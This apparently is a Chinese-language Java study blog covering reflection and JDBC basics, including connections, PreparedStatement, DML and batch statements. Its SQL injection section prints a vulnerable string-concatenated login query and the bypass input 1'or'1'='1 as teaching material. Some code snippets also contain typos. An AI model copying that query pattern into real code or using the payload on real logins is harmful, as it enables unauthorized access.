<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class stuClass2 = Student.class;</span><br></pre></td></tr></table></figure>

<h2 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class stuClass3 = Class.forName(<span class="string">&quot;fanshe.Student&quot;</span>);</span><br><span class="line"><span class="comment">//注意此字符串必须是真实路径，就是带包名的类路径，包名.类名</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>第一种对象都有了还要反射干什么。</strong></p>
<p><strong>第二种需要导入类的包，依赖太强，不导包就抛编译错误。</strong></p>
<p><strong>一般都第三种，一个字符串可以传入也可写在配置文件中等多种方法。</strong></p>
</blockquote>
<h1 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h1><blockquote>
<p>通过反射调用私有属性</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class class1=Class.forName(<span class="string">&quot;反射.Test&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><blockquote>
<p>获取所有公有构造<code>getConstructors()</code></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor[] constructors=class1.getConstructors();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>获取<strong>所有</strong>构造方法（包括私有，受保护）<code>getDeclaredConstrustors()</code></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor[] constructors=class1.getDeclaredConstructors();</span><br><span class="line"><span class="keyword">for</span> (Constructor c:constructors) &#123;</span><br><span class="line">    System.out.println(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用无参公有构造方法</span></span><br><span class="line">Constructor con=class1.getConstructor(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用私有构造方法</span></span><br><span class="line">Constructor constructor=class1.getDeclaredConstructor(String.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>); <span class="comment">//暴力访问，忽略访问修饰符</span></span><br><span class="line">obj=constructor.newInstance(<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">System.out.println(constructor);</span><br></pre></td></tr></table></figure>

<h1 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h1><blockquote>
<p>默认调用无参构造器 </p>
<p>newInstance是 Constructor类的方法（管理构造函数的类）</p>
<p>newInstance是创建了一个构造方法的声明类的新实例对象。并为之调用</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; aClass1 = Class.forName(<span class="string">&quot;demo.Student&quot;</span>);</span><br><span class="line">Object o = aClass1.newInstance();</span><br><span class="line">System.out.println(o);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>反射出无参构造</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor con=s.getConstructor(<span class="keyword">null</span>);</span><br><span class="line">Object obj=con.newInstance(); <span class="comment">//调用构造方法</span></span><br><span class="line">Test test1=(Test) obj;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>反射出有参构造</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; declaredConstructor = aClass1.getDeclaredConstructor(String.class);</span><br><span class="line">Student o1 = (Student) declaredConstructor.newInstance(<span class="string">&quot;hhh&quot;</span>);</span><br><span class="line">System.out.println(o1.getB());</span><br></pre></td></tr></table></figure>

<h1 id="获取成员属性"><a href="#获取成员属性" class="headerlink" title="获取成员属性"></a>获取成员属性</h1><h2 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h2><blockquote>
<p>获取成员字段值：field.<strong>get</strong>(<strong>实例对象</strong>)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object o = aClass1.newInstance();  <span class="comment">//反射实例对象</span></span><br><span class="line"></span><br><span class="line">Field[] declaredFields = aClass1.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field field:declaredFields)&#123;</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>); <span class="comment">//暴力访问私有字段</span></span><br><span class="line">    System.out.println(field.getName()+<span class="string">&quot;:&quot;</span>+field.get(o));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="单个-1"><a href="#单个-1" class="headerlink" title="单个"></a>单个</h2><blockquote>
<p>aClass1.getField(“<strong>字段名</strong>“)；</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取共有属性</span></span><br><span class="line">Field f=aClass1.getField(<span class="string">&quot;num&quot;</span>);</span><br><span class="line"><span class="comment">//获取私有属性</span></span><br><span class="line">Field f1=aClass1.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">f1.setAccessible(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<h2 id="设置字段值"><a href="#设置字段值" class="headerlink" title="设置字段值"></a>设置字段值</h2><blockquote>
<p><strong>set</strong>(obj,value)</p>
<ul>
<li><p>obj:要设置的字段所在的<strong>对象</strong></p>
</li>
<li><p>value:要为字段设置的<strong>值</strong>；</p>
</li>
</ul>
</blockquote>
<blockquote>
<p>Object obj = stuClass.getConstructor().newInstance();//产生Student对象–》Student stu = new Student();<br>//为字段设置值<br><strong>f.set(obj, “刘德华”)</strong>;//为Student对象中的name属性赋值–》stu.name = “刘德华”</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field field=aClass1.getField(<span class="string">&quot;num&quot;</span>);</span><br><span class="line">Object obj=aClass1.getConstructor().newInstance();</span><br><span class="line">field.set(obj,<span class="number">1</span>);</span><br><span class="line">Teacher teacher1=(Teacher) obj;</span><br><span class="line">System.out.println(teacher1.num);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//私有属性</span></span><br><span class="line">Field field1=aClass1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="keyword">true</span>); <span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">field1.set(obj,<span class="string">&quot;ss&quot;</span>);</span><br><span class="line">System.out.println(teacher1.getName());</span><br></pre></td></tr></table></figure>

<h1 id="获取成员方法"><a href="#获取成员方法" class="headerlink" title="获取成员方法"></a>获取成员方法</h1><h2 id="批量-2"><a href="#批量-2" class="headerlink" title="批量"></a>批量</h2><blockquote>
<p>getMethods()</p>
<p>getDeclaredMethods()</p>
</blockquote>
<h2 id="单个-2"><a href="#单个-2" class="headerlink" title="单个"></a>单个</h2><blockquote>
<p><strong>getMethod</strong>(String name, Class&lt;?&gt; parameterType)</p>
<ul>
<li><p>name:方法名</p>
</li>
<li><p>Class…:形参的Class类型对象</p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//公有方法</span></span><br><span class="line">Method method=class1.getMethod(<span class="string">&quot;show1&quot;</span>, String.class)</span><br><span class="line"><span class="comment">//私有方法</span></span><br><span class="line">method2=c.getDeclareMethod(<span class="string">&quot;show4&quot;</span>,<span class="keyword">int</span>.class);</span><br><span class="line">method2.setAcessible(<span class="keyword">true</span>); <span class="comment">//解除私有限定</span></span><br><span class="line">method2.invoke(obj,<span class="number">20</span>);</span><br></pre></td></tr></table></figure>

<h2 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h2><blockquote>
<p><strong>invoke</strong>(Object obj,Object… args):</p>
<ul>
<li><p>obj : 要调用方法的对象；</p>
</li>
<li><p>args:调用方式时所传递的实参</p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实例一个Student对象</span></span><br><span class="line">Object obj=c.getConstrustor().newInstance()</span><br><span class="line">m.invoke(obj,<span class="string">&quot;hhh&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="反射main方法"><a href="#反射main方法" class="headerlink" title="反射main方法"></a>反射main方法</h1><blockquote>
<p><strong>invoke</strong></p>
<p>第一个参数，对象类型，因为方法是static静态的，所以为null可以</p>
<p>第二个参数是String数组，这里要注意在jdk1.4时是数组，jdk1.5之后是可变参数</p>
<p> methodMain.invoke(null, (Object)new String[]{“a”,”b”,”c”})</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fanshe.main;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取Student类的main方法、不要与当前的main方法搞混了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">//1、获取Student对象的字节码</span></span><br><span class="line">			Class clazz = Class.forName(<span class="string">&quot;fanshe.main.Student&quot;</span>);</span><br><span class="line">			<span class="comment">//2、获取main方法</span></span><br><span class="line">			 Method methodMain = clazz.getMethod(<span class="string">&quot;main&quot;</span>, String[].class);</span><br><span class="line">			<span class="comment">//3、调用main方法</span></span><br><span class="line"><span class="comment">//第一个参数，对象类型，因为方法是static静态的，所以为null可以，第二个参数是String数组，这里要注意在jdk1.4时是数组，jdk1.5之后是可变参数</span></span><br><span class="line">			 <span class="comment">//这里拆的时候将  new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125; 拆成3个对象。。。所以需要将它强转。</span></span><br><span class="line">			 methodMain.invoke(<span class="keyword">null</span>, (Object)<span class="keyword">new</span> String[]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>&#125;);<span class="comment">//方式一</span></span><br><span class="line">			<span class="comment">// methodMain.invoke(null, new Object[]&#123;new String[]&#123;&quot;a&quot;,&quot;b&quot;,&quot;c&quot;&#125;&#125;);//方式二</span></span><br><span class="line">			</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="反射的应用"><a href="#反射的应用" class="headerlink" title="反射的应用"></a>反射的应用</h1><h2 id="越过泛型检查"><a href="#越过泛型检查" class="headerlink" title="越过泛型检查"></a>越过泛型检查</h2><p><strong>泛型是在编译期间起作用的。在编译后的.class文件中是没有泛型的</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">list.add(<span class="string">&quot;ss&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;11&quot;</span>);</span><br><span class="line"><span class="comment">//        list.add(11); //类型不一致，报错</span></span><br><span class="line"><span class="comment">//获取Arraylist的class对象，反向调用add()方法</span></span><br><span class="line">Class listClass=list.getClass();</span><br><span class="line">Method m=listClass.getMethod(<span class="string">&quot;add&quot;</span>, Object.class);</span><br><span class="line">m.invoke(list,<span class="number">11</span>);</span><br><span class="line"><span class="keyword">for</span> (Object o:list)&#123;</span><br><span class="line">    System.out.println(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="运行配置文件内容"><a href="#运行配置文件内容" class="headerlink" title="运行配置文件内容"></a>运行配置文件内容</h2><p>我们利用反射和配置文件，可以使：应用程序更新时，对源码无需进行任何修改</p>
<p> 我们只需要将新类发送给客户端，并修改配置文件即可</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">className</span>=<span class="string">反射.调用配置文件</span></span><br><span class="line"><span class="attr">methodName</span>=<span class="string">show</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 调用配置文件 </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        Class s=Class.forName(getValue(<span class="string">&quot;className&quot;</span>));</span><br><span class="line">        Object o1=s.getConstructor().newInstance(); <span class="comment">//获取实例</span></span><br><span class="line">        Method m=s.getMethod(getValue(<span class="string">&quot;methodName&quot;</span>));   <span class="comment">//获取show()方法</span></span><br><span class="line">        m.invoke(o1);                       <span class="comment">//调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getValue</span><span class="params">(String key)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//获取配置文件对象</span></span><br><span class="line">        Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="comment">//pro获取流</span></span><br><span class="line">        FileReader fileReader=<span class="keyword">new</span> FileReader(<span class="string">&quot;Stream\\调用配置文件&quot;</span>);</span><br><span class="line">        pro.load(fileReader);</span><br><span class="line">        <span class="keyword">return</span> pro.getProperty(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们升级这个系统时，不要Student类，而需要新写一个Student2的类时，这时只需要更改pro.txt的文件内容就可以了。代码就一点不用改动</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">className</span> = <span class="string">cn.fanshe.Student2</span></span><br><span class="line"><span class="attr">methodName</span> = <span class="string">show2</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>jdbc</title>
    <url>/2020/07/11/01JDBC/</url>
    <content><![CDATA[<h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><ul>
<li><p>Java Data Base Connectivity（java数据库连接）是一种用于执行SQL语句的<strong>JavaAPI</strong></p>
</li>
<li><p><strong>它由一组类和接口组成</strong></p>
</li>
<li><p>JDBC API使用java的<strong>反射机制</strong>来实现java程序和JDBC驱动的松耦合</p>
</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200909103051980.png" alt="image-20200909103051980"></p>
<h3 id="二、JDBC-API"><a href="#二、JDBC-API" class="headerlink" title="二、JDBC API"></a>二、<strong>JDBC API</strong></h3><h4 id="（1）接口"><a href="#（1）接口" class="headerlink" title="（1）接口"></a>（1）接口</h4><ul>
<li><p>DriverManager驱动管理类，它可以<strong>创建连接</strong>，本身就是一个创建Connection的工厂</p>
</li>
<li><p>java.sql.Driver 主要功能是描述驱动程序，<strong>提供驱动信息</strong>，最重要<strong>实现数据库连接的抽象</strong></p>
</li>
<li><p>java.sql.Connection 是数据库jdbc连接的抽象层，主要<strong>生成SQL并发送给数据库</strong></p>
</li>
<li><p>ResultSet接口（结果集），用来接收select语句返回的查询结果（true/false(query)、num(Update)）</p>
</li>
</ul>
<h4 id="（2）Statement接口"><a href="#（2）Statement接口" class="headerlink" title="（2）Statement接口"></a>（2）Statement接口</h4><p>​    <strong>编译语句</strong> java.sql.Statement</p>
<ul>
<li>由createStatement创建</li>
</ul>
<p>​    <strong>预编译</strong>     java.sql.PreparedStatement</p>
<ul>
<li>继承自Statement接口，有preparedStatement创建，用于发送含有一个或多个参数的SQL语句</li>
<li>效率比Statement高，并且可以防止SQL注入</li>
</ul>
<p>​    <strong>数据库存储过程</strong> java.sql.CallableStatement</p>
<ul>
<li>继承自PrepareStament接口，由prepareCall创建</li>
</ul>
<h4 id="（3）Statement方法"><a href="#（3）Statement方法" class="headerlink" title="（3）Statement方法"></a>（3）Statement方法</h4><ul>
<li><p>execute:  返回是否有结果集</p>
</li>
<li><p>excuteQuery：运行select语句，返回Result结果集合</p>
</li>
<li><p>excuteUpdate：运行insert/update/delete操作，返回更新的行数</p>
</li>
<li><p>addBatch(String sql): 将多条sql语句放到一个批处理中</p>
</li>
<li><p>executeBatch() :  向数据库发送一批sql语句</p>
</li>
<li><p>set<Type>(int colunmIndex,Type val) ：为PreparedStatement回填参数值</p>
</li>
<li><p>getString(int index)  getString(String columnIndex)</p>
</li>
</ul>
<h3 id="三、步骤"><a href="#三、步骤" class="headerlink" title="三、步骤"></a>三、步骤</h3><p>1、导入jar包（<strong>JDBC驱动，jdbc接口的实现</strong>）</p>
<p><strong>idea导入</strong>：File–&gt;project Structure–&gt;Modules–&gt;Dependencies–&gt;+JARS or Directory</p>
<p>2、加载驱动</p>
<p>加载<strong>驱动类Driver</strong>，并执行初始化，这个动作会触发Driver类中的static静态块</p>
<p><strong>创建自己的实例并向DriverManager注册该实例</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> Driver());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var1) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;Can&#x27;t register driver!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 不这样写的原因：</span></span><br><span class="line"><span class="comment">* 1. 会导致注册两次</span></span><br><span class="line"><span class="comment">* 2. 会时程序依赖于MySQL数据包</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//DriverManager.registerDriver(new Driver());//第二种注册方式</span></span><br></pre></td></tr></table></figure>

<p>3、<strong>驱动管理类</strong>获取连接</p>
<p>DriverManager类，本身就是一个创建Connection的工厂</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String url=<span class="string">&quot;jdbc:mysql://localhost:3306/myabl?useSSL=true&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String user=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String password=<span class="string">&quot;*******&quot;</span>;</span><br><span class="line"></span><br><span class="line">Connection conn = DriverManager.getConnection(url,user,password);</span><br></pre></td></tr></table></figure>

<p>4、关闭连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">conn.close();</span><br></pre></td></tr></table></figure>

<h3 id="四、查询"><a href="#四、查询" class="headerlink" title="四、查询"></a>四、查询</h3><h4 id="prepareStatement接口"><a href="#prepareStatement接口" class="headerlink" title="prepareStatement接口"></a><strong>prepareStatement接口</strong></h4><p>优点:预编译，使用占位符</p>
<h4 id="executeQuery"><a href="#executeQuery" class="headerlink" title="executeQuery"></a>executeQuery</h4><p>1、数据库操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql=<span class="string">&quot;select *from emp&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>2、装载MySql语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PreparedStatement preparedStatement=conn.prepareStatement(sql);</span><br></pre></td></tr></table></figure>

<p>3、发送MySql语句到数据库执行，获取返回结果</p>
<p><strong>execute()</strong>: 可以执行任何SQL语句，返回boolean值</p>
<p>​                执行后第一个结果是ResultSet,否则返回true</p>
<p><strong>executeQuery()</strong>:执行select语句</p>
<p><strong>executeUpdate()</strong> :执行DML语句（insert,update,delect),影响返回的记录条数</p>
<h4 id="Resultset"><a href="#Resultset" class="headerlink" title="Resultset"></a>Resultset</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ResultSet resultSet=preparedStatement.executeQuery();</span><br></pre></td></tr></table></figure>

<p>4、遍历返回结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">    <span class="comment">//根据第几列获取值</span></span><br><span class="line">   	System.out.println(resultSet.getInt(<span class="number">1</span>));</span><br><span class="line">    <span class="comment">//根据字段名获取</span></span><br><span class="line">    System.out.println(resultSet.getString(<span class="string">&quot;ename&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h4><p>set<Type>(int colunmIndex,Type val) ：为PreparedStatement回填参数值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;请输入员工工号&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> i=s.nextInt();</span><br><span class="line"></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">Connection connection= DriverManager.getConnection(url,user,password);</span><br><span class="line"><span class="comment">//?为占位符</span></span><br><span class="line"><span class="comment">//使用？占位符，执行时会替换成实际数据，预编译</span></span><br><span class="line">String sql=<span class="string">&quot;select *from emp where ename=?&quot;</span>;</span><br><span class="line"><span class="comment">//发送sql语句到MySql数据库并执行，返回执行结果，如果有占位符，对占位符先赋值</span></span><br><span class="line">PreparedStatement preparedStatement=connection.prepareStatement(sql);</span><br><span class="line"><span class="comment">//给preparedStatement设置参数,第一个参数是索引从1开始，第二个是具体值</span></span><br><span class="line">preparedStatement.setInt(<span class="number">1</span>,i);</span><br><span class="line"></span><br><span class="line">ResultSet resultSet=preparedStatement.executeQuery();</span><br></pre></td></tr></table></figure>

<h3 id="五、Sql注入"><a href="#五、Sql注入" class="headerlink" title="五、Sql注入"></a>五、Sql注入</h3><h4 id="statement接口"><a href="#statement接口" class="headerlink" title="statement接口"></a>statement接口</h4><p><strong>使用拼接验证，若密码，使用  1’or’1’=’1,也会被验证成功</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Statement statement=connection.createStatement();</span><br><span class="line">ResultSet resultSet=statement.executeQuery(sql);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql=<span class="string">&quot;select *from userpass where username=&#x27;&quot;</span>+username+<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>+passwordin+<span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;请输入用户名&quot;</span>);</span><br><span class="line">String username=s.next();</span><br><span class="line">System.out.println(<span class="string">&quot;请输入密码&quot;</span>);</span><br><span class="line">String passwordin=s.next();</span><br><span class="line"></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">Connection connection= DriverManager.getConnection(url,user,password);</span><br><span class="line">String sql=<span class="string">&quot;select *from userpass where username=&#x27;&quot;</span>+username+<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>+password+<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//发送sql语句到MySql数据库并执行，返回执行结果</span></span><br><span class="line">Statement statement=connection.createStatement();</span><br><span class="line">ResultSet resultSet=statement.executeQuery(sql);</span><br><span class="line"><span class="keyword">if</span> (resultSet.next())&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="六、DML"><a href="#六、DML" class="headerlink" title="六、DML"></a>六、DML</h3><h4 id="executeUpdate"><a href="#executeUpdate" class="headerlink" title="executeUpdate"></a>executeUpdate</h4><p>insert/update/delete</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">       connection = DriverManager.getConnection(</span><br><span class="line">           <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/blog?useSSL=false&quot;</span>,</span><br><span class="line">           <span class="string">&quot;root&quot;</span>,</span><br><span class="line">           <span class="string">&quot;xxxxxx&quot;</span></span><br><span class="line">       )</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//修改update</span></span><br><span class="line">       statement = connection.createStatement();</span><br><span class="line">       <span class="comment">//返回执行受影响的条数，执行失败返回0</span></span><br><span class="line">       <span class="keyword">int</span> i = statement.executeUpdate(</span><br><span class="line">           <span class="string">&quot;update categories set path=&#x27;改一下试试&#x27; where id=1&quot;</span></span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;更新成功&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;更新失败&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//插入insert</span></span><br><span class="line">       <span class="keyword">int</span> j = statement.executeUpdate(</span><br><span class="line">  <span class="string">&quot;insert into categories(name,pid,path) values (&#x27;插入语句&#x27;,2,&#x27;要用单引号&#x27;);&quot;</span></span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span>(j&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;插入成功&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;插入失败&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">	<span class="comment">//删除delete</span></span><br><span class="line">       <span class="keyword">int</span> k = statement.executeUpdate(</span><br><span class="line">           <span class="string">&quot;delete from categories where id = 2;&quot;</span></span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span>(k&gt;<span class="number">0</span>)&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;删除成功&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<h3 id="七、批处理"><a href="#七、批处理" class="headerlink" title="七、批处理"></a>七、批处理</h3><p>一次执行多条语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Connection conn=<span class="keyword">null</span>;</span><br><span class="line">    Statement stmt=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        conn=getConnection();</span><br><span class="line">        stmt=conn.createStatement();</span><br><span class="line">        String sql=<span class="string">&quot;drop table if exists school&quot;</span>;</span><br><span class="line">        String sql2=<span class="string">&quot;create table school(id int,name varchar(20))&quot;</span>;</span><br><span class="line">        String sql3=<span class="string">&quot;insert into school values(2,&#x27;hh&#x27;)&quot;</span>;</span><br><span class="line">        String sql4=<span class="string">&quot;update school set id=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">        stmt.addBatch(sql);</span><br><span class="line">        stmt.addBatch(sql2);</span><br><span class="line">        stmt.addBatch(sql3);</span><br><span class="line">        stmt.addBatch(sql4);</span><br><span class="line">        stmt.executeBatch();</span><br><span class="line">        System.out.println(<span class="string">&quot;批处理成功&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        closeAll(conn,stmt,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

